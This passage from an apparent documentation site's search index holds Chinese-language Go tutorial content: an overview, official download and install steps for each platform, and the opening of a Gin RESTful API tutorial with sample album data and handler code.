\u6a21\u5757\u2014\u2014\u5305\u542b\u60a8\u5bfc\u5165\u7684\u5305\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b83\u4e0b\u8f7d\u4e86\u6700\u65b0\u7248\u672c\u2014\u2014v1.5.2\u3002","title":"\u8c03\u7528\u5916\u90e8\u5305\u4e2d\u7684\u4ee3\u7801"},{"location":"go/getting_started/#more-code","text":"\u901a\u8fc7\u8fd9\u4e2a\u5feb\u901f\u4ecb\u7ecd\uff0c\u60a8\u5b89\u88c5\u4e86 Go \u5e76\u5b66\u4e60\u4e86\u4e00\u4e9b\u57fa\u7840\u77e5\u8bc6\u3002\u8981\u4f7f\u7528\u53e6\u4e00\u4e2a\u6559\u7a0b\u7f16\u5199\u66f4\u591a\u4ee3\u7801\uff0c\u8bf7\u67e5\u770b \u521b\u5efa Go \u6a21\u5757 \u3002","title":"\u66f4\u591a\u4ee3\u7801"},{"location":"go/go/","text":"Go \u8bed\u8a00\u6559\u7a0b \uf0c1 Go \u662f\u4e00\u79cd\u5f00\u6e90\u7f16\u7a0b\u8bed\u8a00\uff0c\u53ef\u4ee5\u8f7b\u677e\u6784\u5efa\u7b80\u5355\u3001\u53ef\u9760\u548c\u9ad8\u6548\u7684\u8f6f\u4ef6\u3002 \u7b80\u4ecb \uf0c1 \u5b98\u7f51: https://go.dev/ Git \u5b58\u50a8\u5e93\u4f4d\u4e8e https://go.googlesource.com/go \u3002\u5728 https://github.com/golang/go \u6709\u4e00\u4e2a\u5b58\u50a8\u5e93\u7684\u955c\u50cf\u3002 \u77e5\u8bc6\u5171\u4eab 3.0 \u7f72\u540d\u8bb8\u53ef \u3002 \u5b89\u88c5 \uf0c1 \u4e0b\u8f7d\u5b89\u88c5 Go \u5165\u95e8 \uf0c1 \u4e00\u4e2a\u7b80\u77ed\u7684 Hello, World \u5165\u95e8\u6559\u7a0b \u3002\u4e86\u89e3\u4e00\u4e9b\u5173\u4e8e Go \u4ee3\u7801\u3001\u5de5\u5177\u3001\u5305\u548c\u6a21\u5757\u7684\u77e5\u8bc6\u3002 \u521b\u5efa Go \u6a21\u5757 \uf0c1 \u4ecb\u7ecd\u6a21\u5757\u3001\u51fd\u6570\u3001\u9519\u8bef\u5904\u7406\u3001\u6570\u7ec4\u3001map\u3001\u5355\u5143\u6d4b\u8bd5\u548c\u7f16\u8bd1\u7684\u7b80\u77ed \u6559\u7a0b \u3002 \u591a\u6a21\u5757\u5de5\u4f5c\u533a \uf0c1 \u4ecb\u7ecd\u5728 Go \u4e2d\u521b\u5efa\u548c\u4f7f\u7528 \u591a\u6a21\u5757\u5de5\u4f5c\u533a \u7684\u57fa\u7840\u77e5\u8bc6\u3002\u591a\u6a21\u5757\u5de5\u4f5c\u533a\u5bf9\u4e8e\u8de8\u591a\u4e2a\u6a21\u5757\u8fdb\u884c\u66f4\u6539\u5f88\u6709\u7528\u3002 \u4f7f\u7528 Go \u548c Gin \u5f00\u53d1 RESTful API \uf0c1 \u4ecb\u7ecd \u4f7f\u7528 Go \u548c Gin Web \u6846\u67b6\u7f16\u5199 RESTful Web \u670d\u52a1 API \u7684\u57fa\u7840\u77e5\u8bc6\u3002 \u6cdb\u578b\u5165\u95e8 \uf0c1 \u4f7f\u7528 \u6cdb\u578b \uff0c\u60a8\u53ef\u4ee5\u4e3a\u8c03\u7528\u4ee3\u7801\u58f0\u660e\u548c\u4f7f\u7528\u7684\u51fd\u6570\u6216\u7c7b\u578b\u7f16\u5199\u63d0\u4f9b\u4efb\u4f55\u4e00\u7ec4\u7c7b\u578b\u3002 \u5b9e\u73b0\u7b80\u5355\u7684Web\u5e94\u7528\u7a0b\u5e8f \uf0c1 \u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684 Web \u5e94\u7528\u7a0b\u5e8f \u3002 \u53c2\u8003\u8d44\u6599 \uf0c1 Go Documentation: https://go.dev/doc/ Go | \u83dc\u9e1f\u6559\u7a0b: https://www.runoob.com/go/go-tutorial.html","title":"Go tutorial"},{"location":"go/go/#go-tutorial","text":"Go \u662f\u4e00\u79cd\u5f00\u6e90\u7f16\u7a0b\u8bed\u8a00\uff0c\u53ef\u4ee5\u8f7b\u677e\u6784\u5efa\u7b80\u5355\u3001\u53ef\u9760\u548c\u9ad8\u6548\u7684\u8f6f\u4ef6\u3002","title":"Go \u8bed\u8a00\u6559\u7a0b"},{"location":"go/go/#introduction","text":"\u5b98\u7f51: https://go.dev/ Git \u5b58\u50a8\u5e93\u4f4d\u4e8e https://go.googlesource.com/go \u3002\u5728 https://github.com/golang/go \u6709\u4e00\u4e2a\u5b58\u50a8\u5e93\u7684\u955c\u50cf\u3002 \u77e5\u8bc6\u5171\u4eab 3.0 \u7f72\u540d\u8bb8\u53ef \u3002","title":"\u7b80\u4ecb"},{"location":"go/go/#install","text":"\u4e0b\u8f7d\u5b89\u88c5 Go","title":"\u5b89\u88c5"},{"location":"go/go/#getting-start","text":"\u4e00\u4e2a\u7b80\u77ed\u7684 Hello, World \u5165\u95e8\u6559\u7a0b \u3002\u4e86\u89e3\u4e00\u4e9b\u5173\u4e8e Go \u4ee3\u7801\u3001\u5de5\u5177\u3001\u5305\u548c\u6a21\u5757\u7684\u77e5\u8bc6\u3002","title":"\u5165\u95e8"},{"location":"go/go/#create-module","text":"\u4ecb\u7ecd\u6a21\u5757\u3001\u51fd\u6570\u3001\u9519\u8bef\u5904\u7406\u3001\u6570\u7ec4\u3001map\u3001\u5355\u5143\u6d4b\u8bd5\u548c\u7f16\u8bd1\u7684\u7b80\u77ed \u6559\u7a0b \u3002","title":"\u521b\u5efa Go \u6a21\u5757"},{"location":"go/go/#multi-module-workspaces","text":"\u4ecb\u7ecd\u5728 Go \u4e2d\u521b\u5efa\u548c\u4f7f\u7528 \u591a\u6a21\u5757\u5de5\u4f5c\u533a \u7684\u57fa\u7840\u77e5\u8bc6\u3002\u591a\u6a21\u5757\u5de5\u4f5c\u533a\u5bf9\u4e8e\u8de8\u591a\u4e2a\u6a21\u5757\u8fdb\u884c\u66f4\u6539\u5f88\u6709\u7528\u3002","title":"\u591a\u6a21\u5757\u5de5\u4f5c\u533a"},{"location":"go/go/#web-service-gin","text":"\u4ecb\u7ecd \u4f7f\u7528 Go \u548c Gin Web \u6846\u67b6\u7f16\u5199 RESTful Web \u670d\u52a1 API \u7684\u57fa\u7840\u77e5\u8bc6\u3002","title":"\u4f7f\u7528 Go \u548c Gin \u5f00\u53d1 RESTful API"},{"location":"go/go/#generics","text":"\u4f7f\u7528 \u6cdb\u578b \uff0c\u60a8\u53ef\u4ee5\u4e3a\u8c03\u7528\u4ee3\u7801\u58f0\u660e\u548c\u4f7f\u7528\u7684\u51fd\u6570\u6216\u7c7b\u578b\u7f16\u5199\u63d0\u4f9b\u4efb\u4f55\u4e00\u7ec4\u7c7b\u578b\u3002","title":"\u6cdb\u578b\u5165\u95e8"},{"location":"go/go/#write-web-applications","text":"\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684 Web \u5e94\u7528\u7a0b\u5e8f \u3002","title":"\u5b9e\u73b0\u7b80\u5355\u7684Web\u5e94\u7528\u7a0b\u5e8f"},{"location":"go/go/#references","text":"Go Documentation: https://go.dev/doc/ Go | \u83dc\u9e1f\u6559\u7a0b: https://www.runoob.com/go/go-tutorial.html","title":"\u53c2\u8003\u8d44\u6599"},{"location":"go/install/","text":"\u4e0b\u8f7d\u5b89\u88c5 Go \uf0c1 \u4e0b\u8f7d\u548c\u5b89\u88c5 Go \u7684\u8bf4\u660e\u3002 \u4f7f\u7528\u6b64\u5904\u63cf\u8ff0\u7684\u6b65\u9aa4\u5feb\u901f\u4e0b\u8f7d\u5e76\u5b89\u88c5 Go\u3002 \u6709\u5173\u5b89\u88c5\u7684\u5176\u4ed6\u5185\u5bb9\uff0c\u60a8\u53ef\u80fd\u5bf9\u4ee5\u4e0b\u5185\u5bb9\u611f\u5174\u8da3\uff1a \u7ba1\u7406 Go \u5b89\u88c5 \u2014\u2014\u5982\u4f55\u5b89\u88c5\u591a\u4e2a\u7248\u672c\u548c\u5378\u8f7d\u3002 \u4ece\u6e90\u4ee3\u7801\u5b89\u88c5 Go \u2014\u2014\u5982\u4f55\u68c0\u67e5\u6e90\u4ee3\u7801\u3001\u5728\u60a8\u81ea\u5df1\u7684\u673a\u5668\u4e0a\u6784\u5efa\u5b83\u4eec\u5e76\u8fd0\u884c\u5b83\u4eec\u3002 1. \u4e0b\u8f7d \uf0c1 Linux : https://go.dev/dl/go1.18.3.linux-amd64.tar.gz Mac : https://go.dev/dl/go1.18.3.darwin-amd64.pkg Windows : https://go.dev/dl/go1.18.3.windows-amd64.msi \u5176\u4ed6\u4e0b\u8f7d: https://go.dev/dl/ \u3002 \u6ce8\u610f\uff1a\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5go\u547d\u4ee4\u4f7f\u7528 Google \u8fd0\u884c\u7684 Go \u6a21\u5757\u955c\u50cf\u548c Go \u6821\u9a8c\u548c\u6570\u636e\u5e93\u4e0b\u8f7d\u548c\u9a8c\u8bc1\u6a21\u5757\u3002 2. \u5b89\u88c5 \uf0c1 Linux \u5220\u9664\u4ee5\u524d\u7684 Go \u5b89\u88c5\uff0c\u7136\u540e\u5c06\u521a\u521a\u4e0b\u8f7d\u7684\u6587\u6863\u89e3\u538b\u5230/usr/local : $ rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.3.linux-amd64.tar.gz \u53ef\u80fd\u9700\u8981\u4ee5 root \u8eab\u4efd\u6216\u901a\u8fc7 sudo \u8fd0\u884c\u8be5\u547d\u4ee4\u3002 \u4e0d\u8981\u5c06\u5b58\u6863\u89e3\u538b\u7f29\u5230\u73b0\u6709\u7684 /usr/local/go \u6811\u4e2d\u3002 \u4f17\u6240\u5468\u77e5\uff0c\u8fd9\u4f1a\u4ea7\u751f\u635f\u574f\u7684 Go \u5b89\u88c5\u3002 \u5c06 /usr/local/go/bin \u6dfb\u52a0\u5230 PATH \u73af\u5883\u53d8\u91cf\u4e2d: \u53ef\u4ee5\u901a\u8fc7\u5c06\u4ee5\u4e0b\u884c\u6dfb\u52a0\u5230\u60a8\u7684 $HOME/.profile \u6216 /etc/profile \uff08\u7528\u4e8e\u7cfb\u7edf\u8303\u56f4\u7684\u5b89\u88c5\uff09\u6765\u505a\u5230\u8fd9\u4e00\u70b9\uff1a export PATH=$PATH:/usr/local/go/bin \u6ce8\u610f \uff1a\u5bf9\u914d\u7f6e\u6587\u4ef6\u6240\u505a\u7684\u66f4\u6539\u53ef\u80fd\u8981\u7b49\u5230\u60a8\u4e0b\u6b21\u767b\u5f55\u8ba1\u7b97\u673a\u65f6\u624d\u4f1a\u751f\u6548\u3002\u8981\u7acb\u5373\u5e94\u7528\u66f4\u6539\uff0c\u53ea\u9700\u76f4\u63a5\u8fd0\u884c shell \u547d\u4ee4\u6216\u4f7f\u7528\u8bf8\u5982 source $HOME/.profile. Mac : \u6253\u5f00\u4f60\u4e0b\u8f7d\u7684\u5305\u6587\u4ef6\uff0c\u6309\u7167\u63d0\u793a\u5b89\u88c5Go\u3002 \u8be5\u8f6f\u4ef6\u5305\u5c06 Go \u53d1\u884c\u7248\u5b89\u88c5\u5230 /usr/local/go\u3002\u8be5\u8f6f\u4ef6\u5305\u5e94\u5c06 /usr/local/go/bin \u76ee\u5f55\u653e\u5728\u60a8\u7684 PATH\u73af\u5883\u53d8\u91cf\u4e2d\u3002\u60a8\u53ef\u80fd\u9700\u8981\u91cd\u65b0\u542f\u52a8\u4efb\u4f55\u6253\u5f00\u7684\u7ec8\u7aef\u4f1a\u8bdd\u624d\u80fd\u4f7f\u66f4\u6539\u751f\u6548\u3002 Windows : \u6253\u5f00\u4e0b\u8f7d\u7684MSI\u6587\u4ef6\u5e76\u6309\u7167\u63d0\u793a\u5b89\u88c5\u3002 \u901a\u8fc7\u547d\u4ee4\u6765\u9a8c\u8bc1\u5df2\u5b89\u88c5\u7684 Go \u7248\u672c\uff1a $ go version 3. \u53bb\u7f16\u7801 \uf0c1 \u5b89\u88c5\u4e86\uff01\u8bbf\u95ee \u5165\u95e8\u6559\u7a0b \u4ee5\u7f16\u5199\u4e00\u4e9b\u7b80\u5355\u7684 Go \u4ee3\u7801\u3002 \u53c2\u8003 \uf0c1 Go \u5b89\u88c5\u8bf4\u660e: https://go.dev/doc/install","title":"Install"},{"location":"go/install/#download-and-install","text":"\u4e0b\u8f7d\u548c\u5b89\u88c5 Go \u7684\u8bf4\u660e\u3002 \u4f7f\u7528\u6b64\u5904\u63cf\u8ff0\u7684\u6b65\u9aa4\u5feb\u901f\u4e0b\u8f7d\u5e76\u5b89\u88c5 Go\u3002 \u6709\u5173\u5b89\u88c5\u7684\u5176\u4ed6\u5185\u5bb9\uff0c\u60a8\u53ef\u80fd\u5bf9\u4ee5\u4e0b\u5185\u5bb9\u611f\u5174\u8da3\uff1a \u7ba1\u7406 Go \u5b89\u88c5 \u2014\u2014\u5982\u4f55\u5b89\u88c5\u591a\u4e2a\u7248\u672c\u548c\u5378\u8f7d\u3002 \u4ece\u6e90\u4ee3\u7801\u5b89\u88c5 Go \u2014\u2014\u5982\u4f55\u68c0\u67e5\u6e90\u4ee3\u7801\u3001\u5728\u60a8\u81ea\u5df1\u7684\u673a\u5668\u4e0a\u6784\u5efa\u5b83\u4eec\u5e76\u8fd0\u884c\u5b83\u4eec\u3002","title":"\u4e0b\u8f7d\u5b89\u88c5 Go"},{"location":"go/install/#download","text":"Linux : https://go.dev/dl/go1.18.3.linux-amd64.tar.gz Mac : https://go.dev/dl/go1.18.3.darwin-amd64.pkg Windows : https://go.dev/dl/go1.18.3.windows-amd64.msi \u5176\u4ed6\u4e0b\u8f7d: https://go.dev/dl/ \u3002 \u6ce8\u610f\uff1a\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5go\u547d\u4ee4\u4f7f\u7528 Google \u8fd0\u884c\u7684 Go \u6a21\u5757\u955c\u50cf\u548c Go \u6821\u9a8c\u548c\u6570\u636e\u5e93\u4e0b\u8f7d\u548c\u9a8c\u8bc1\u6a21\u5757\u3002","title":"1. \u4e0b\u8f7d"},{"location":"go/install/#install","text":"Linux \u5220\u9664\u4ee5\u524d\u7684 Go \u5b89\u88c5\uff0c\u7136\u540e\u5c06\u521a\u521a\u4e0b\u8f7d\u7684\u6587\u6863\u89e3\u538b\u5230/usr/local : $ rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.3.linux-amd64.tar.gz \u53ef\u80fd\u9700\u8981\u4ee5 root \u8eab\u4efd\u6216\u901a\u8fc7 sudo \u8fd0\u884c\u8be5\u547d\u4ee4\u3002 \u4e0d\u8981\u5c06\u5b58\u6863\u89e3\u538b\u7f29\u5230\u73b0\u6709\u7684 /usr/local/go \u6811\u4e2d\u3002 \u4f17\u6240\u5468\u77e5\uff0c\u8fd9\u4f1a\u4ea7\u751f\u635f\u574f\u7684 Go \u5b89\u88c5\u3002 \u5c06 /usr/local/go/bin \u6dfb\u52a0\u5230 PATH \u73af\u5883\u53d8\u91cf\u4e2d: \u53ef\u4ee5\u901a\u8fc7\u5c06\u4ee5\u4e0b\u884c\u6dfb\u52a0\u5230\u60a8\u7684 $HOME/.profile \u6216 /etc/profile \uff08\u7528\u4e8e\u7cfb\u7edf\u8303\u56f4\u7684\u5b89\u88c5\uff09\u6765\u505a\u5230\u8fd9\u4e00\u70b9\uff1a export PATH=$PATH:/usr/local/go/bin \u6ce8\u610f \uff1a\u5bf9\u914d\u7f6e\u6587\u4ef6\u6240\u505a\u7684\u66f4\u6539\u53ef\u80fd\u8981\u7b49\u5230\u60a8\u4e0b\u6b21\u767b\u5f55\u8ba1\u7b97\u673a\u65f6\u624d\u4f1a\u751f\u6548\u3002\u8981\u7acb\u5373\u5e94\u7528\u66f4\u6539\uff0c\u53ea\u9700\u76f4\u63a5\u8fd0\u884c shell \u547d\u4ee4\u6216\u4f7f\u7528\u8bf8\u5982 source $HOME/.profile. Mac : \u6253\u5f00\u4f60\u4e0b\u8f7d\u7684\u5305\u6587\u4ef6\uff0c\u6309\u7167\u63d0\u793a\u5b89\u88c5Go\u3002 \u8be5\u8f6f\u4ef6\u5305\u5c06 Go \u53d1\u884c\u7248\u5b89\u88c5\u5230 /usr/local/go\u3002\u8be5\u8f6f\u4ef6\u5305\u5e94\u5c06 /usr/local/go/bin \u76ee\u5f55\u653e\u5728\u60a8\u7684 PATH\u73af\u5883\u53d8\u91cf\u4e2d\u3002\u60a8\u53ef\u80fd\u9700\u8981\u91cd\u65b0\u542f\u52a8\u4efb\u4f55\u6253\u5f00\u7684\u7ec8\u7aef\u4f1a\u8bdd\u624d\u80fd\u4f7f\u66f4\u6539\u751f\u6548\u3002 Windows : \u6253\u5f00\u4e0b\u8f7d\u7684MSI\u6587\u4ef6\u5e76\u6309\u7167\u63d0\u793a\u5b89\u88c5\u3002 \u901a\u8fc7\u547d\u4ee4\u6765\u9a8c\u8bc1\u5df2\u5b89\u88c5\u7684 Go \u7248\u672c\uff1a $ go version","title":"2. \u5b89\u88c5"},{"location":"go/install/#go-code","text":"\u5b89\u88c5\u4e86\uff01\u8bbf\u95ee \u5165\u95e8\u6559\u7a0b \u4ee5\u7f16\u5199\u4e00\u4e9b\u7b80\u5355\u7684 Go \u4ee3\u7801\u3002","title":"3. \u53bb\u7f16\u7801"},{"location":"go/install/#references","text":"Go \u5b89\u88c5\u8bf4\u660e: https://go.dev/doc/install","title":"\u53c2\u8003"},{"location":"go/web_service_gin/","text":"\u4f7f\u7528 Go \u548c Gin \u5f00\u53d1 RESTful API \uf0c1 \u672c\u6559\u7a0b\u4ecb\u7ecd\u4e86\u4f7f\u7528 Go \u548c Gin Web \u6846\u67b6 (Gin) \u7f16\u5199 RESTful Web \u670d\u52a1 API \u7684\u57fa\u7840\u77e5\u8bc6\u3002 Gin \u7b80\u5316\u4e86\u8bb8\u591a\u4e0e\u6784\u5efa Web \u5e94\u7528\u7a0b\u5e8f\uff08\u5305\u62ec Web \u670d\u52a1\uff09\u76f8\u5173\u7684\u7f16\u7801\u4efb\u52a1\u3002\u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u4f7f\u7528 Gin \u6765\u8def\u7531\u8bf7\u6c42\u3001\u68c0\u7d22\u8bf7\u6c42\u8be6\u7ec6\u4fe1\u606f\u4ee5\u53ca\u7f16\u7ec4 JSON \u4ee5\u83b7\u53d6\u54cd\u5e94\u3002 \u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u6784\u5efa\u4e00\u4e2a\u5177\u6709\u4e24\u4e2a\u7aef\u70b9\u7684 RESTful API \u670d\u52a1\u5668\u3002\u60a8\u7684\u793a\u4f8b\u9879\u76ee\u5c06\u662f\u6709\u5173\u8001\u5f0f\u7235\u58eb\u4e50\u5531\u7247\u7684\u6570\u636e\u5b58\u50a8\u5e93\u3002 \u672c\u6559\u7a0b\u5305\u62ec\u4ee5\u4e0b\u90e8\u5206\uff1a \u8bbe\u8ba1 API \u7aef\u70b9\u3002 \u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\u3002 \u521b\u5efa\u6570\u636e\u3002 \u7f16\u5199\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\u4ee5\u8fd4\u56de\u6240\u6709\u9879\u76ee\u3002 \u7f16\u5199\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\u6765\u6dfb\u52a0\u4e00\u4e2a\u65b0\u9879\u76ee\u3002 \u7f16\u5199\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\u6765\u8fd4\u56de\u4e00\u4e2a\u7279\u5b9a\u7684\u9879\u76ee\u3002 \u8981\u5c1d\u8bd5\u5c06\u6b64\u4f5c\u4e3a\u60a8\u5728 Google Cloud Shell \u4e2d\u5b8c\u6210\u7684\u4ea4\u4e92\u5f0f\u6559\u7a0b\uff0c\u8bf7\u5355\u51fb\u4e0b\u9762\u7684\u6309\u94ae\u3002 \u672c\u6559\u7a0b\u9700\u8981 Go 1.16 \u6216\u66f4\u9ad8\u7248\u672c\u3002 1. \u8bbe\u8ba1 API \u7aef\u70b9 \uf0c1 \u60a8\u5c06\u6784\u5efa\u4e00\u4e2a API\uff0c\u8be5 API \u53ef\u8ba9\u60a8\u8bbf\u95ee\u51fa\u552e\u8001\u5f0f\u9ed1\u80f6\u5531\u7247\u7684\u5546\u5e97\u3002\u56e0\u6b64\uff0c\u60a8\u9700\u8981\u63d0\u4f9b\u7aef\u70b9(endpoints)\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u7aef\u70b9\u4e3a\u7528\u6237\u83b7\u53d6\u548c\u6dfb\u52a0\u76f8\u518c\u3002 \u5728\u5f00\u53d1 API \u65f6\uff0c\u60a8\u901a\u5e38\u4ece\u8bbe\u8ba1\u7aef\u70b9\u5f00\u59cb\u3002\u5982\u679c\u7aef\u70b9\u6613\u4e8e\u7406\u89e3\uff0c\u60a8\u7684 API \u7528\u6237\u5c06\u83b7\u5f97\u66f4\u5927\u7684\u6210\u529f\u3002 \u4ee5\u4e0b\u662f\u60a8\u5c06\u5728\u672c\u6559\u7a0b\u4e2d\u521b\u5efa\u7684\u7aef\u70b9\u3002 /albums GET \u2013 \u83b7\u53d6\u6240\u6709\u4e13\u8f91\u7684\u5217\u8868\uff0c\u4ee5 JSON \u5f62\u5f0f\u8fd4\u56de\u3002 POST \u2013 \u4ece\u4f5c\u4e3a JSON \u53d1\u9001\u7684\u8bf7\u6c42\u6570\u636e\u4e2d\u6dfb\u52a0\u65b0\u4e13\u8f91\u3002 /albums/:id GET \u2013 \u901a\u8fc7 ID \u83b7\u53d6\u4e13\u8f91\uff0c\u5c06\u4e13\u8f91\u6570\u636e\u4f5c\u4e3a JSON \u8fd4\u56de\u3002 \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u4e3a\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\u3002 2. \u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939 \uf0c1 \u9996\u5148\uff0c\u4e3a\u60a8\u8981\u7f16\u5199\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u9879\u76ee\u3002 \u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\u5e76\u5207\u6362\u5230\u60a8\u7684\u4e3b\u76ee\u5f55\u3002 \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a web-service-gin \u7684\u76ee\u5f55\u3002 $ mkdir web-service-gin $ cd web-service-gin \u521b\u5efa\u4e00\u4e2a\u6a21\u5757\uff0c\u60a8\u53ef\u4ee5\u5728\u5176\u4e2d\u7ba1\u7406\u4f9d\u8d56\u9879\u3002 $ go mod init example/web-service-gin go: creating new go.mod: module example/web-service-gin \u6b64\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a go.mod \u6587\u4ef6\uff0c\u60a8\u6dfb\u52a0\u7684\u4f9d\u8d56\u9879\u5c06\u5728\u5176\u4e2d\u5217\u51fa\u4ee5\u4f9b\u8ddf\u8e2a\u3002\u6709\u5173\u4f7f\u7528\u6a21\u5757\u8def\u5f84\u547d\u540d\u6a21\u5757\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u7ba1\u7406\u4f9d\u8d56\u9879 \u3002 3. \u521b\u5efa\u6570\u636e \uf0c1 \u4e3a\u4e86\u4f7f\u6559\u7a0b\u7b80\u5355\uff0c\u60a8\u5c06\u6570\u636e\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u3002\u66f4\u5178\u578b\u7684 API \u5c06\u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\u3002 \u8bf7\u6ce8\u610f\uff0c\u5c06\u6570\u636e\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u610f\u5473\u7740\u6bcf\u6b21\u505c\u6b62\u670d\u52a1\u5668\u65f6\uff0c\u76f8\u518c\u96c6\u90fd\u4f1a\u4e22\u5931\uff0c\u7136\u540e\u5728\u542f\u52a8\u65f6\u91cd\u65b0\u521b\u5efa\u3002 3.1. \u7f16\u5199\u4ee3\u7801 \uf0c1 \u5728 web-service \u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a main.go \u7684\u6587\u4ef6\u3002\u60a8\u5c06\u5728\u6b64\u6587\u4ef6\u4e2d\u7f16\u5199\u60a8\u7684 Go \u4ee3\u7801\u3002 \u8fdb\u5165 main.go\uff0c\u5728\u6587\u4ef6\u9876\u90e8\uff0c\u7c98\u8d34\u4ee5\u4e0b\u5305\u58f0\u660e\u3002 package main \u72ec\u7acb\u7a0b\u5e8f\uff08\u4e0e\u5e93\u76f8\u53cd\uff09\u59cb\u7ec8\u4f4d\u4e8e package main \u4e2d\u3002 \u5728\u5305\u58f0\u660e\u4e0b\uff0c\u7c98\u8d34\u4ee5\u4e0b album \u7ed3\u6784\u58f0\u660e\u3002\u60a8\u5c06\u4f7f\u7528\u5b83\u5728\u5185\u5b58\u4e2d\u5b58\u50a8\u4e13\u8f91\u6570\u636e\u3002 \u7ed3\u6784\u6807\u8bb0\uff0c\u4f8b\u5982 json:\"artist\" \u6307\u5b9a\u5f53\u7ed3\u6784\u7684\u5185\u5bb9\u88ab\u5e8f\u5217\u5316\u4e3a JSON \u65f6\u5b57\u6bb5\u7684\u540d\u79f0\u5e94\u8be5\u662f\u4ec0\u4e48\u3002\u5982\u679c\u6ca1\u6709\u5b83\u4eec\uff0cJSON \u5c06\u4f7f\u7528\u7ed3\u6784\u7684\u5927\u5199\u5b57\u6bb5\u540d\u79f0\u2014\u2014\u8fd9\u79cd\u98ce\u683c\u5728 JSON \u4e2d\u5e76\u4e0d\u5e38\u89c1\u3002 // album represents data about a record album. type album struct { ID string `json:\"id\"` Title string `json:\"title\"` Artist string `json:\"artist\"` Price float64 `json:\"price\"` } \u5728\u60a8\u521a\u521a\u6dfb\u52a0\u7684\u7ed3\u6784\u58f0\u660e\u4e0b\uff0c\u7c98\u8d34\u4ee5\u4e0b album \u7ed3\u6784\u7247\u6bb5\uff0c\u5176\u4e2d\u5305\u542b\u60a8\u5c06\u7528\u4e8e\u542f\u52a8\u7684\u6570\u636e\u3002 // albums slice to seed record album data. var albums = []album{ {ID: \"1\", Title: \"Blue Train\", Artist: \"John Coltrane\", Price: 56.99}, {ID: \"2\", Title: \"Jeru\", Artist: \"Gerry Mulligan\", Price: 17.99}, {ID: \"3\", Title: \"Sarah Vaughan and Clifford Brown\", Artist: \"Sarah Vaughan\", Price: 39.99}, } \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u7f16\u5199\u4ee3\u7801\u6765\u5b9e\u73b0\u60a8\u7684\u7b2c\u4e00\u4e2a\u7aef\u70b9\u3002 4. \u67e5\u8be2\u6240\u6709\u9879\u76ee \uf0c1 \u5f53\u5ba2\u6237\u7aef\u5728\u53d1\u51fa GET /albums \u8bf7\u6c42\u65f6\uff0c\u60a8\u5e0c\u671b\u5c06\u6240\u6709\u4e13\u8f91\u4ee5 JSON \u683c\u5f0f\u8fd4\u56de\u3002 \u4e3a\u6b64\uff0c\u60a8\u5c06\u7f16\u5199\u4ee5\u4e0b\u5185\u5bb9\uff1a \u51c6\u5907\u54cd\u5e94\u7684\u903b\u8f91 \u5c06\u8bf7\u6c42\u8def\u5f84\u6620\u5c04\u5230\u60a8\u7684\u903b\u8f91\u7684\u4ee3\u7801 \u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e0e\u5b83\u4eec\u5728\u8fd0\u884c\u65f6\u7684\u6267\u884c\u65b9\u5f0f\u76f8\u53cd\uff0c\u4f46\u60a8\u9996\u5148\u6dfb\u52a0\u4f9d\u8d56\u9879\uff0c\u7136\u540e\u662f\u4f9d\u8d56\u4e8e\u5b83\u4eec\u7684\u4ee3\u7801\u3002 4.1. \u7f16\u5199\u4ee3\u7801 \uf0c1 \u5728\u4e0a\u4e00\u8282\u4e2d\u6dfb\u52a0\u7684\u7ed3\u6784\u4ee3\u7801\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u4ee5\u83b7\u53d6\u4e13\u8f91\u5217\u8868\u3002 \u6b64 getAlbums \u51fd\u6570\u4ece album \u7ed3\u6784\u5207\u7247\u521b\u5efa JSON\uff0c\u5e76\u5c06 JSON \u5199\u5165\u54cd\u5e94\u3002 // getAlbums responds with the list of all albums as JSON. func getAlbums(c *gin.Context) { c.IndentedJSON(http.StatusOK, albums) } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u7f16\u5199\u4e00\u4e2a\u5e26 gin.Context \u53c2\u6570\u7684\u51fd\u6570 getAlbums \u3002\u8bf7\u6ce8\u610f\uff0c\u4f60\u53ef\u4ee5\u7ed9\u8fd9\u4e2a\u51fd\u6570\u8d77\u4efb\u4f55\u540d\u5b57\u2014\u2014Gin \u548c Go \u90fd\u4e0d\u9700\u8981\u7279\u5b9a\u7684\u51fd\u6570\u540d\u683c\u5f0f\u3002 gin.Context \u662f Gin \u6700\u91cd\u8981\u7684\u90e8\u5206\u3002\u5b83\u643a\u5e26\u8bf7\u6c42\u8be6\u7ec6\u4fe1\u606f\u3001\u9a8c\u8bc1\u548c\u5e8f\u5217\u5316 JSON \u7b49\u3002\uff08\u5c3d\u7ba1\u540d\u79f0\u76f8\u4f3c\uff0c\u4f46\u8fd9\u4e0e Go \u7684\u5185\u7f6e context \u5305\u4e0d\u540c\u3002\uff09 \u8c03\u7528 Context.IndentedJSON 